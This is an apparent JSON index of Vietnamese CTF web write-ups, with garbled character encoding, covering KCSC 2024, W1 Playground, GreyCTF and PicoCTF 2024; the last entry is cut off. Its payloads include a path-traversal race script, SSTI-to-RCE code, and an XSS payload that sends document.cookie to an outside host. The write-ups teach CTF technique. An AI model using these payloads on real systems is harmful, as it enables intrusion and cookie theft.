[
  
  {
    "title": "KCSC 2024",
    "url": "/posts/KCSCCTF/",
    "categories": "CTF Writeup",
    "tags": "Python, Flask, Path Traversal",
    "date": "2024-05-15 23:00:00 +0700",
    





    
    "snippet": "BÃ i Ka Tuá»•i Tráº»TÃ³m táº¯t: Challenge nÃ y lÃ  sá»­ dá»¥ng má»™t server flask Ä‘Æ¡n giáº£n vá»›i function Ä‘á»c file táº¡i endpoint / vá»›i params file sau Ä‘Ã³ thÃªm ./static vÃ o Ä‘áº±ng trÆ°á»›c file Ä‘á»ƒ Ä‘á»c file trong thÆ° má»¥c st...",
    "content": "BÃ i Ka Tuá»•i Tráº»TÃ³m táº¯t: Challenge nÃ y lÃ  sá»­ dá»¥ng má»™t server flask Ä‘Æ¡n giáº£n vá»›i function Ä‘á»c file táº¡i endpoint / vá»›i params file sau Ä‘Ã³ thÃªm ./static vÃ o Ä‘áº±ng trÆ°á»›c file Ä‘á»ƒ Ä‘á»c file trong thÆ° má»¥c static. Pháº§n sau lÃ  kiá»ƒm tra file cÃ³ tá»“n táº¡i khÃ´ng, dung lÆ°á»£ng cá»§a file pháº£i bÃ© hÆ¡n 2MB vÃ  cÃ³ quyá»n Ä‘á»c nÃ³ thÃ¬ sáº½ tiáº¿p tá»¥c Ä‘i qua regex náº¿u qua thÃ¬ sáº½ tráº£ vá» ná»™i dung cá»§a file Ä‘Ã³.from flask import Flask, request, redirectfrom os import access, R_OK, statfrom os.path import isfile, join, normpathimport regeximport osapp = Flask(__name__, static_url_path='/static', static_folder='static')@app.get('/')def home():\tif request.args.get('file'):\t\tfilename = join(\"./static\", request.args.get('file'))\t\tif isfile(normpath(filename)) and access(normpath(filename), R_OK) and (stat(normpath(filename)).st_size &lt; 1024 * 1024 * 2):\t\t\ttry:\t\t\t\twith open(normpath(filename), \"rb\") as file:\t\t\t\t\tif not regex.search(r'^(([ -~])+.)+([(^~\\'!*&lt;&gt;:;,?\"*|%)]+)|([^\\x00-\\x7F]+)(([ -~])+.)+$', filename, timeout=2) and \"flag\" not in filename:\t\t\t\t\t\treturn file.read(1024 * 1024 * 2)\t\t\texcept:\t\t\t\tpass\treturn redirect(\"/?file=index.html\")BÃ i nÃ y nhÃ¬n vÃ o lÃ  cÃ³ thá»ƒ nháº­n ra ngay dÃ­nh lá»—i path traversal khi chá»‰ dÃ¹ng normpath Ä‘á»ƒ check path cá»§a file. ChÃºng ta cÃ³ thá»ƒ Ä‘Æ¡n giáº£n lÃ  thÃªm /// vÃ o lÃ  path cá»§a file sáº½ Ä‘Æ°á»£c trá» vá» root (vÃ­ dá»¥ ///etc/passwd)Sau khi biáº¿t Ä‘Ã¢y lÃ  lá»—i path traversal thÃ¬ mÃ¬nh thá»­ kiá»ƒm xem filter cá»§a regex cÃ³ thá»ƒ bypass Ä‘Æ°á»£c khÃ´ngÄá»c xong filter thÃ¬ thÃ¬ mÃ¬nh tháº¥y Ä‘Æ¡n giáº£n regex Ä‘áº§u tiÃªn khÃ´ng cÃ³ nghÄ©a gÃ¬ cáº£ vÃ  cháº·n náº¿u tÃªn file cÃ³ chá»¯ flag. LÃºc nÃ y thÃ¬ vá»«a may cÃ³ gá»£i Ã½ lÃ  File descriptor nÃªn mÃ¬nh nghÄ© ra má»™t cÃ¡ch khÃ¡cFile descriptorFile descriptor lÃ  má»™t Ä‘á»‹nh danh Ä‘á»™c nháº¥t cho má»™t táº­p tin cÃ¡i mÃ  há»‡ Ä‘iá»u hÃ nh gÃ¡n cho nÃ³ khi mÃ  má»Ÿ má»™t file nÃ o Ä‘Ã³. NÃ³ cho phÃ©p cÃ¡c chÆ°Æ¡ng trÃ¬nh tÆ°Æ¡ng tÃ¡c vá»›i files, sockets, I/O. File descriptor thÆ°á»ng lÃ  má»™t sá»‘ nguyÃªn khÃ´ng Ã¢m vÃ  Ä‘Æ°á»£c dÃ¹ng Ä‘á»ƒ theo dÃµi cÃ¡c file vÃ  thá»±c hiá»‡n thao tÃ¡c trÃªn nÃ³.Váº­y vá»›i cÃ¡i nÃ y thÃ¬ chÃºng ta sáº½ lÃ m gÃ¬ ? NhÃ¬n vÃ o Ä‘oáº¡n code trÃªn khi má»Ÿ má»™t file trong text mode (â€˜wâ€™, â€˜râ€™, â€˜wtâ€™, â€˜rtâ€™, etc.) thÃ¬ nÃ³ sáº½ return má»™t subclass cá»§a io.TextIOBase. Váº­y cÃ³ nghÄ©a lÃ  sao, cÃ³ nghÄ©a lÃ  nÃ³ sáº½ má»Ÿ má»™t file descriptor khi Ä‘á»c má»™t file. Ta cÃ³ thá»ƒ táº­n dá»¥ng cÃ¡i nÃ y Ä‘á»ƒ Ä‘á»c file thÃ´ng qua viá»‡c khÃ´ng cáº§n Ä‘á»c qua Ä‘Æ°á»ng Ä‘áº«n cá»§a nÃ³.Má»™t vÃ­ dá»¥/proc/pid/fd/ÄÃ¢y lÃ  thÆ° má»¥c con chá»©a cÃ¡c symlink trá» Ä‘áº¿n má»™t file nÃ o Ä‘Ã³. Trong nÃ y luÃ´n cÃ³ cÃ¡c file 0, 1, 2 tÆ°Æ¡ng á»©ng vá»›i 0 lÃ  standard input, 1 lÃ  standard output, 2 lÃ  standard error vÃ  cÃ¡c file khÃ¡c cÃ³ thá»ƒ lÃ  trá» Ä‘áº¿n 1 socket nÃ o Ä‘Ã³ hoáº·c 1 file cá»¥ thá»ƒKáº¿t há»£p hai Ä‘iá»u trÃªn ta cÃ³ thá»ƒ suy ra Ä‘Æ°á»£c cÃ¡ch giáº£i nhÆ° sauKhi mÃ  má»Ÿ 1 file trong text mode thÃ¬ nÃ³ sáº½ má»Ÿ má»™t file descriptor trong proc/pid/fd (pid lÃ  mÃ£ sá»‘ cá»§a process Ä‘Ã³) vÃ  file Ä‘Ã³ láº¡i symlink Ä‘áº¿n file ta muá»‘n Ä‘á»c =&gt; Ä‘á»c file báº¥t kÃ¬VÃ­ dá»¥Váº­y Ä‘á»ƒ giáº£i bÃ i nÃ y thÃ¬ mÃ¬nh sáº½ dÃ¹ng file descriptor Ä‘á»ƒ Ä‘á»c flagNhÆ°ng mÃ  cÃ³ má»™t váº¥n Ä‘á» lÃ  khi má»Ÿ file thÃ¬ nÃ³ láº¡i Ä‘Ã³ng file quÃ¡ nhanh lÃ m mÃ¬nh chÆ°a ká»‹p access vÃ o process id cá»§a nÃ³ nÃªn bÃ¢y giá» mÃ¬nh má»›i Ä‘á»ƒ Ã½ pháº§n regex filter cá»§a nÃ³.Náº¿u tÃªn file quÃ¡ dÃ i thÃ¬ khi Ä‘Æ°a qua regex nÃ³ sáº½ cháº¡y ráº¥t lÃ¢u(max lÃ  2 giÃ¢y) vÃ  mÃ¬nh cÃ³ thá»ƒ táº­n dá»¥ng khoáº£ng thá»i gian nÃ y Ä‘á»ƒ vÃ o proc/pid/fd vÃ  Ä‘á»c fileSau má»™t lÃºc fuzz thÃ¬ mÃ¬nh tháº¥y pid cá»§a nÃ³ nháº£y ngáº«u nhiÃªn trong cÃ¡c giÃ¡ trá»‹ 1,7,8,9 vÃ  file descriptor cÃ³ tÃªn lÃ  10 sáº½ lÃ  file symlink Ä‘áº¿n file mÃ¬nh Ä‘á»cVáº­y ta cÃ³ thá»ƒ request Ä‘áº¿n server vá»›i payload /?file=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa./../../../../../flag.txt Ä‘á»ƒ má»Ÿ má»™t file descriptor link Ä‘áº¿n file /flag.txt vÃ  do tÃªn quÃ¡ dÃ i nÃªn regex sáº½ bá»‹ pháº£i cháº¡y lÃ¢uTrong thá»i gian 2s, mÃ¬nh gá»­i Ä‘áº¿n táº¥t cáº£ pid 1,7,8,9 vÃ  Ä‘á»c file descriptor 10 Ä‘á»ƒ Ä‘á»c flagDÆ°á»›i Ä‘Ã¢y lÃ  script Ä‘á»ƒ tá»± Ä‘á»™ng láº¥y flagimport requestsimport threadingimport timeurl = \"http://103.163.24.78:8888/?file=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa./../../../../../flag.txt\"def get(id):    r = requests.get(url = f\"http://103.163.24.78:8888/?file=///proc/{id}/fd/10\")    if \"KCSC\" in r.text:        print(r.text)        exit()def start1():    r = requests.get(url = url)if __name__ == \"__main__\":    threading.Thread(target=start1).start()    time.sleep(1)    threading.Thread(target=get, args=(1,)).start()    threading.Thread(target=get, args=(7,)).start()    threading.Thread(target=get, args=(8,)).start()    threading.Thread(target=get, args=(9,)).start()VÃ  ra flag"
  },
  
  {
    "title": "W1 Playground Writeup",
    "url": "/posts/W1Playground/",
    "categories": "CTF Writeup",
    "tags": "Prototype Pollution, SSTI, API testing, XSS, PHP",
    "date": "2024-04-30 23:00:00 +0700",
    





    
    "snippet": "BÃ i 1: easy loginPhÃ¢n tÃ­ch qua code thÃ¬ chÃºng ta cÃ³ 2 endpoint cáº§n Ä‘á»ƒ tÃ¢m lÃ  â€œ/loginâ€ vÃ  â€œ/adminâ€Chá»©c nÄƒng login báº¯t chÃºng ta post data lÃªn vÃ  server sáº½ tráº£ láº¡i mÃ£ jwtkey Ä‘á»ƒ chÃºng ta Ä‘Äƒng nháº­pChá»©c ...",
    "content": "BÃ i 1: easy loginPhÃ¢n tÃ­ch qua code thÃ¬ chÃºng ta cÃ³ 2 endpoint cáº§n Ä‘á»ƒ tÃ¢m lÃ  â€œ/loginâ€ vÃ  â€œ/adminâ€Chá»©c nÄƒng login báº¯t chÃºng ta post data lÃªn vÃ  server sáº½ tráº£ láº¡i mÃ£ jwtkey Ä‘á»ƒ chÃºng ta Ä‘Äƒng nháº­pChá»©c nÄƒng admin kiá»ƒm tra xem chÃºng ta cÃ³ pháº£i admin khÃ´ng qua isAdmin=true sau khi phÃ¢n tÃ­ch jwtkeySau khi phÃ¢n tÃ­ch bÃ i nÃ y dÃ­nh lá»—i Prototype Pollution báº±ng cÃ¡ch thÃªm logindata[\"__proto__\"][isAdmin]=true vÃ o thÃ¬ prototype cá»§a logindata sáº½ cÃ³ thuá»™c tÃ­nh isAdmin=true tá»« Ä‘Ã³ logindata sáº½ káº¿ thá»«a thuá»™c tÃ­nh Ä‘Ã³PayloadCÃ³ jwtkey rá»“i thÃ¬ vÃ o admin Ä‘á»ƒ láº¥y flag thÃ´iFlag : W1{REDACTED}BÃ i 2: render4freePhÃ¢n tÃ­ch qua code thÃ¬ web nÃ y Ä‘ang sá»­ dá»¥ng Pug template engine Ä‘á»ƒ in ra cÃ¡c kÃ½ tá»± chÃºng ta gÃµ vÃ oSau khi phÃ¢n tÃ­ch code thÃ¬ chÃºng ta cÃ³ thá»ƒ rÃºt ra web Ä‘ang dÃ­nh lá»—i SSTI nhÆ°ng cÃ³ 1 function nÃ y Ä‘ang cháº·n chÃºng ta khai thÃ¡c SSTISau khi Ä‘á»c pug document thÃ¬ chÃºng ta cÃ³ thá»ƒ sá»­ dá»¥ng â€œ-â€œ Ä‘á»ƒ viáº¿t code jsBÃ¢y giá» chÃºng ta cÃ³ thá»ƒ dÃ¹ng â€œ-â€œ Ä‘á»ƒ viáº¿t code js thÃ¬ chÃºng ta viáº¿t gÃ¬ ? ÄÃ³ chÃ­nh lÃ  ghi Ä‘Ã¨ láº¡i function filter kÃ½ tá»± cá»§a chÃºng ta- global.replace_bad_char = str_to_replace =&gt; str_to_replaceTiáº¿p tá»¥c ghi Ä‘Ã¨ láº¡i function trÃªn Ä‘á»ƒ chÃºng ta cÃ³ thá»ƒ thá»±c hiá»‡n lá»‡nh eval- global.replace_bad_char = str_to_replace =&gt; eval(str_to_replace)Sau khi ghi Ä‘Ã¨ Ä‘Æ°á»£c rá»“i thÃ¬ viáº¿t vÃ o Ä‘á»ƒ thá»­ thá»±c hiá»‡n RCE nÃ oPayload require('child_process').exec('ping hacked.sv')LÃ m gÃ¬ dá»… tháº¿ anh Shin24 (author bÃ i nÃ y) Ä‘Ã£ set type cá»§a nodejs lÃ  module tá»©c chÃºng ta khÃ´ng thá»ƒ require mÃ  pháº£i sá»­ dá»¥ng importNhÆ°ng mÃ  code Ä‘Ã£ chá»‰nh Promise.prototype.then Ä‘Ã£ thÃ nh 1 hÃ m tráº£ vá» nullOat gÃ¬ dark váº­y, lÃºc nÃ y chÃºng ta sá»­ dá»¥ng process.binding Ä‘á»ƒ import cÃ¡c modules cá»§a nodejs  process.binding('spawn_sync').spawn({     file: 'ls',    args: [''],    stdio: [        { type: 'pipe', readable: true, writable: false },        { type: 'pipe', readable: false, writable: true },        { type: 'pipe', readable: false, writable: true }  ]}).output.toString()Ngon váº­y lÃ  cÃ³ thá»ƒ thá»±c hiá»‡n lá»‡nh lsÄá»ƒ Ã½ á»Ÿ file Docker author Ä‘Ã£ táº¡o ra 1 file /read_flag Ä‘á»ƒ Ä‘á»c flag váº­y chÃºng ta thá»±c thi file read_flag Ä‘á»ƒ nháº­n flagPayload:  process.binding('spawn_sync').spawn({     file: '/read_flag',    args: [''],    stdio: [        { type: 'pipe', readable: true, writable: false },        { type: 'pipe', readable: false, writable: true },        { type: 'pipe', readable: false, writable: true }  ]}).output.toString()Flag: W1{REDACTED}BÃ i 3: Super sanitizerTÃ³m táº¯t bÃ i web nÃ y sá»­ dá»¥ng WASM Ä‘Æ°á»£c compile tá»« C vÃ  sá»­ dá»¥ng nÃ³ Ä‘á»ƒ xá»­ lÃ½ input cá»§a user  File C nháº­n input cá»§a user vÃ  blacklist Ä‘á»ƒ xá»­ lÃ½ náº¿u cÃ³ kÃ½ tá»± blacklist thÃ¬ kÃ½ tá»± Ä‘Ã³ sáº½ bá»‹ xoÃ¡ khá»i input cá»§a userBlacklist cá»§a bÃ i nÃ y nhÆ° sau &lt;imgoner='\\\"'&gt;Lá»—i cá»§a bÃ i nÃ y náº±m á»Ÿ Ä‘Ã¢yKhi chÃºng ta cho 1 kÃ½ tá»± cÃ³ Ä‘á»™ dÃ i lÃ  0x300 thÃ¬ raw_str[0x300] sáº½ bá»‹ trÃ n vÃ  sáº½ ghi Ä‘Ã¨ lÃªn kÃ½ tá»± Ä‘áº§u tiÃªn cá»§a blacklist lÃ  \\x00 tá»« Ä‘Ã³ blacklist sáº½ trá»Ÿ thÃ nh rá»—ng -&gt; bypass filterNhÆ°ng Ä‘áº¿n Ä‘Ã¢y thÃ¬ váº«n chÆ°a xong, web cÃ³ CSP Ä‘á»ƒ lÃ m XSS khÃ³ hÆ¡nSau má»™t lÃºc fuzzing Ä‘á»ƒ kiá»ƒm tra thÃ¬ dÃ¹ CSP cháº·n redirect nhÆ°ng window.location.href=hackerwebsite.com váº«n resolve dns váº­y ta cÃ³ thá»ƒ táº­n dá»¥ng cÃ¡i nÃ y Ä‘á»ƒ leak flag do flag khÃ¡ dÃ i nÃªn mÃ¬nh leak 2 láº§n Ä‘á»ƒ láº¥y flag (vÃ­ dá»¥ flag.hackerwebsite.com)NhÆ°ng leak kiá»ƒu gÃ¬? MÃ¬nh Ä‘Ã£ thá»­ leak kiá»ƒu btoa(document.cookie)+\".hackerwebsite.com\" nhÆ°ng khi leak thÃ¬ vÃ¬ lÃ½ do báº£o máº­t dns query sáº½ ngáº«u nhiÃªn uppercase hoáº·c lowercase cÃ¡c kÃ½ tá»± lÃ m base64 bá»‹ lá»—i nÃªn nghÄ© sang cÃ¡ch khÃ¡c lÃ  document.cookie.charCodeAt(0-&gt;document.cookie.length-1) Ä‘á»ƒ leak ra tá»«ng kÃ½ tá»± cá»§a flag sang mÃ£ asciiÄÃ¢y lÃ  payload Ä‘á»ƒ leak 1 ná»¯a flag (do flag khÃ¡ dÃ i nÃªn pháº£i leak 2 láº§n)  aa&lt;img src=1 onerror='document.body.innerHTML=\" &lt;img src=x onerror=eval\\u0028String.fromCharCode\\u0028119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,34,104,116,116,112,58,47,47,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,46,115,117,98,115,116,114,105,110,103,40,48,44,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,46,108,101,110,103,116,104,47,50,41,46,115,112,108,105,116,40,34,34,41,46,109,97,112,40,99,61,62,99,46,99,104,97,114,67,111,100,101,65,116,40,48,41,41,46,106,111,105,110,40,34,46,34,41,43,34,46,119,117,107,122,98,55,50,122,46,114,101,113,117,101,115,116,114,101,112,111,46,99,111,109,34\\u0029\\u0029&gt;\";'&gt;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaPayload thá»© 2 Ä‘á»ƒ leak pháº§n cÃ²n láº¡i  aa&lt;img src=1 onerror='document.body.innerHTML=\" &lt;img src=x onerror=eval\\u0028String.fromCharCode\\u0028119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,34,104,116,116,112,58,47,47,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,46,115,117,98,115,116,114,105,110,103,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,46,108,101,110,103,116,104,47,50,44,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,46,108,101,110,103,116,104,41,46,115,112,108,105,116,40,34,34,41,46,109,97,112,40,99,61,62,99,46,99,104,97,114,67,111,100,101,65,116,40,48,41,41,46,106,111,105,110,40,34,46,34,41,43,34,46,119,117,107,122,98,55,50,122,46,114,101,113,117,101,115,116,114,101,112,111,46,99,111,109,34\\u0029\\u0029&gt;\";'&gt;aaaaaaaaDecode mÃ£ ascii vÃ  láº¥y flagFlag: W1{WASM_101_and_some_js_gadget_hope_you_enjoyed:)))))))))))))))))))))))))))))))))))))))))@0x4161}"
  },
  
  {
    "title": "GreyCTF 2024",
    "url": "/posts/GreyCTF/",
    "categories": "CTF Writeup",
    "tags": "MYSQL, Base64",
    "date": "2024-04-21 23:00:00 +0700",
    





    
    "snippet": "No Sql InjectionI asked My friend Jason to build me a new e-commerce website. We just finished the login system and there's already bugs ğŸ¤¦Author: jrohttp://challs.nusgreyhats.org:33336PhÃ¢n tÃ­ch qua...",
    "content": "No Sql InjectionI asked My friend Jason to build me a new e-commerce website. We just finished the login system and there's already bugs ğŸ¤¦Author: jrohttp://challs.nusgreyhats.org:33336PhÃ¢n tÃ­ch qua thÃ¬ bÃ i nÃ y cÃ³ cÃ¡c chá»©c nÄƒng chÃ­nh sau  /api/register/1app.post('/api/register/1', async (req, res) =&gt; {    try {        let { username } = req.body;        username = decode(username);        const token = btoa(JSON.stringify({            name: username,            admin: false        }));        console.log(token);        await query(\"insert into tokens values (?)\", [token]);        res.json({ \"err\": false, \"token\": token });    } catch (err) {        console.log(err);        res.json({ \"err\": true });    }})  /api/register/2app.post('/api/register/2', async (req, res) =&gt; {    try {        let { password, token } = req.body;        password = decode(password);        token = decode(token);        const result = await query(\"select 1 from tokens where token = ?\", [token]);        console.log(result);        if (result.length != 1) {            return res.json({ err: \"Token not found!\" });        }        await query(\"delete from tokens where token = ?\", [token]);        const { name, admin } = JSON.parse(atob(token));        console.log(JSON.parse(atob(token)))        await query(\"insert into users (name, password, admin) values (?, ?, ?)\", [name.toString(), password, admin === true]);        res.json({ \"err\": false });    } catch (err) {        console.log(err);        res.json({ \"err\": true });    }})  /api/loginapp.post('/api/login', async (req, res) =&gt; {    try {        let { password, username } = req.body;        password = decode(password);        username = decode(username);        const result = await query(\"select admin from users where name = ? and password = ?\", [username, password]);        if (result.length != 1) {            return res.json({ err: \"Username or password did not match\" });        }        if(result[0].admin) {            res.json({ \"err\": false, \"msg\": config.flag});        } else {            res.json({ \"err\": false, \"msg\": \"You've logged in successfully, but there's no flag here!\"});        }        // Prevent too many records from filling up the database        await query(\"delete from users where name = ? and password = ?\", [username, password]);    } catch (err) {        console.log(err);        res.json({ \"err\": true });    }})Giáº£i thÃ­ch cÃ¡c api endpoint  /register/1 sáº½ nháº­n username khi chÃºng ta post data, sau Ä‘Ã³báº±ng cÃ¡ch thÃªm vÃ o má»™t key:value - admin:false vÃ o vÃ  chuyá»ƒn sang dáº¡ng json vÃ  base64 encode nÃ³Sau Ä‘Ã³ backend sáº½ thÃªm token nÃ y vÃ o báº£ng tokens vÃ  gá»­i tráº£ ta token nhÆ° trÃªn  /register/2 sáº½ nháº­n password vÃ  token (cáº£ 2 Ä‘á»u Ä‘Ã£ bá»‹ base64) khi chÃºng ta post data, sau Ä‘Ã³ decode cáº£ 2 vÃ  kiá»ƒm tra xem token Ä‘Ã£ cÃ³ trong db chÆ°a, náº¿u cÃ³ thÃ¬ parse nÃ³ thÃ nh json vÃ  láº¥y dá»¯ liá»‡u cá»§a cÃ¡c trÆ°á»ng name, password, adminSau Ä‘Ã³ backend sáº½ xoÃ¡ token nÃ y khá»i database vÃ  thÃªm cÃ¡c trÆ°á»ng trÃªn vÃ o báº£ng users  /login thÃ¬ Ä‘Æ¡n giáº£n chá»‰ lÃ  check xem account cÃ³ pháº£i lÃ  admin khÃ´ng cÃ³ thÃ¬ in ra flag, khÃ´ng thÃ¬ khÃ´ng in gÃ¬ cáº£Váº­y trong nÃ y cÃ³ cÃ¡i gÃ¬ táº­n dá»¥ng Ä‘Æ°á»£c Ä‘á»ƒ khai thÃ¡c ? ThÃ´ng thÆ°á»ng so sÃ¡nh cá»§a mysql lÃ  case-insensitive tá»©c lÃ  â€˜aâ€™ == â€˜Aâ€™ váº­y báº±ng 1 cÃ¡ch nÃ o Ä‘áº¥y chÃºng ta cÃ³ thá»ƒ Ä‘iá»u khiá»ƒn cÃ¡i token cá»§a chÃºng ta vÃ  khi parse nÃ³ thÃ¬ nÃ³ sáº½ ra data má»™t cÃ¡ch khÃ¡c thÆ°á»ngTá»« Ä‘Ã³ token thÃ´ng thÆ°á»ng lÃ {\"name\":\"yuu\",\"admin\":false}Sau khi bá»‹ chÃºng ta chá»‰nh sá»­a vÃ  nÃ³ bá»‹ biáº¿n Ä‘á»•i thÃ nh{\"name\":\"yuu\",\"admin\":true}VÃ¬ chÃºng ta chá»‰ cÃ³ thá»ƒ kiá»ƒm soÃ¡t Ä‘Æ°á»£c giÃ¡ trá»‹ cá»§a username nÃªn chÃºng ta pháº£i lÃ m sao Ä‘Ã³ Ä‘á»ƒ phÃ¡ dáº¥u \" Ä‘á»ƒ áº£nh hÆ°á»Ÿng Ä‘áº¿n cÃ¡c Ä‘áº·c tÃ­nh cá»§a JSON á»Ÿ Ä‘Ã¢y Ä‘Ã³ chÃ­nh lÃ  chá»‰nh sá»­a in hoa, in thÆ°á»ng cá»§a cÃ¡c kÃ½ tá»± Ä‘áº¡i diá»‡n cho dÃ¢u \"Sau khi phÃ¡ Ä‘Æ°á»£c dáº¥u \" vÃ  viáº¿t Ä‘Æ°á»£c admin = true thÃ¬ chÃºng ta váº«n cÃ²n 1 viá»‡c ná»¯a pháº§n admin = false á»Ÿ phÃ­a sau váº«n cÃ²n vÃ  sáº½ ghi Ä‘Ã¨ giÃ¡ trá»‹ admin á»Ÿ trÆ°á»›c, lÃºc nÃ y chÃºng ta cÃ³ thá»ƒ tiáº¿p tá»¥c phÃ¡ giÃ¡ trá»‹ cá»§a admin = false á»Ÿ sau báº±ng cÃ¡ch chá»‰nh láº¡i kÃ½ tá»± in hoa -&gt; thÆ°á»ng cá»§a kÃ½ tá»± Ä‘áº¡i diá»‡n cho giÃ¡ trá»‹ adminVÃ  cÃ³ 1 Ä‘iá»u cáº§n lÆ°u Ã½ lÃ  JSON.stringify khi parse cÃ¡c JSON object náº¿u cÃ¡c kÃ½ tá»± Ä‘Ã³ khÃ´ng thá»ƒ decode qua UTF-8 hay UTF-16 thÃ¬ nÃ³ sáº½ tráº£ vá» unicode code vÃ  escape nÃ³ vÃ­ dá»¥ (JSON.stringify('\\uDF06') -&gt; '\"\\\\udf06\"' )Váº­y chÃºng ta vá»«a corrupt cÃ¡i base64 token vÃ  kiá»ƒm tra xem cÃ¡c kÃ½ tá»± Ä‘Ã³ cÃ³ thá»ƒ decode qua UTF-8 hay UTF-16 khÃ´ngDÆ°á»›i Ä‘Ã¢y lÃ  má»™t cÃ¡ch mÃ¬nh tÃ¬m Ä‘Æ°á»£csafe : b'{\"name\":\"yuu (\\xac\\x8aadmin\\x8a:true-\\xc2c\\x8a3\\xa2to\",\"admin\":false}',malicious: b'{\"name\":\"yuu \",\"admin\":true,\"c\":\"to\",\"admOn\":false}'2 base64 cá»§a payload trÃªnsafe: eyJuYW1lIjoieXV1ICisimFkbWluijp0cnVlLcJjijOidG8iLCJhZG1PbiI6ZmFsc2V9,malicious: eyJuYW1lIjoieXV1ICIsImFkbWluIjp0cnVlLCJjIjoidG8iLCJhZG1PbiI6ZmFsc2V9Login báº±ng username á»Ÿ trÃªn (trong trÆ°á»ng há»£p payload cá»§a mÃ¬nh lÃ  yuu ) vÃ  password ta cÃ³ flag"
  },
  
  {
    "title": "PicoCTF 2024",
    "url": "/posts/PicoCTF2024/",
    "categories": "CTF Writeup",
    "tags": "NoSQL, Bypass Filter, PHP Webshell, Symlink",
    "date": "2024-03-27 23:00:00 +0700",
    





    
    "snippet": "PicoCTF2024 Ä‘Ã£ káº¿t thÃºc, giáº£i nÃ y mÃ¬nh cÃ³ khÃ¡ nhiá»u nuá»‘i tiáº¿c vÃ¬ bÃ i cuá»‘i web quÃ¡ khÃ³, dÃ¹ khÃ´ng clear nhÆ°ng team Zafk1el tá»¥i mÃ¬nh Ä‘Ã£ cá»‘ gáº¯ng háº¿t sá»©c. Tiá»‡n Ä‘Ã¢y mÃ¬nh viáº¿t writeup má»™t sá»‘ bÃ i Ä‘Ã¡ng chÃº ...",
    "content": "PicoCTF2024 Ä‘Ã£ káº¿t thÃºc, giáº£i nÃ y mÃ¬nh cÃ³ khÃ¡ nhiá»u nuá»‘i tiáº¿c vÃ¬ bÃ i cuá»‘i web quÃ¡ khÃ³, dÃ¹ khÃ´ng clear nhÆ°ng team Zafk1el tá»¥i mÃ¬nh Ä‘Ã£ cá»‘ gáº¯ng háº¿t sá»©c. Tiá»‡n Ä‘Ã¢y mÃ¬nh viáº¿t writeup má»™t sá»‘ bÃ i Ä‘Ã¡ng chÃº Ã½ trong giáº£i nÃ y.GENERAL SKILLS: dont-you-love-bannersCan you abuse the banner?The server has been leaking some crucial information on tethys.picoctf.net 64560. Use the leaked information to get to the server.To connect to the running application use nc tethys.picoctf.net 64699. From the above information abuse the machine and find the flag in the /root directory.CÃCH 1: symlinkTrÆ°á»›c háº¿t thÃ¬ tráº£ lá»i vÃ i cÃ¢u há»i Ä‘á»ƒ Ä‘Æ°á»£c vÃ o Ä‘Æ°á»£c shell cá»§a playerKhi mÃ¬nh vÃ o Ä‘Æ°á»£c shell thÃ¬ báº¯t Ä‘áº§u lÆ°á»£n qua cÃ¡c folder, mÃ´ táº£ cá»§a bÃ i báº£o hÃ£y tÃ¬m cÃ¡ch Ä‘á»c flag á»Ÿ folder /root nÃªn mÃ¬nh cd Ä‘áº¿n folder Ä‘Ã³ Ä‘á»ƒ xemTáº¥t nhiÃªn lÃ  lÃ m gÃ¬ cÃ³ chuyá»‡n dá»… tháº¿, flag Ä‘Ã£ bá»‹ giá»›i háº¡n quyá»n chá»‰ cÃ³ root má»›i cÃ³ quyá»n Ä‘á»cVáº­y lÃ m gÃ¬ bÃ¢y giá» ? LÃºc nÃ y 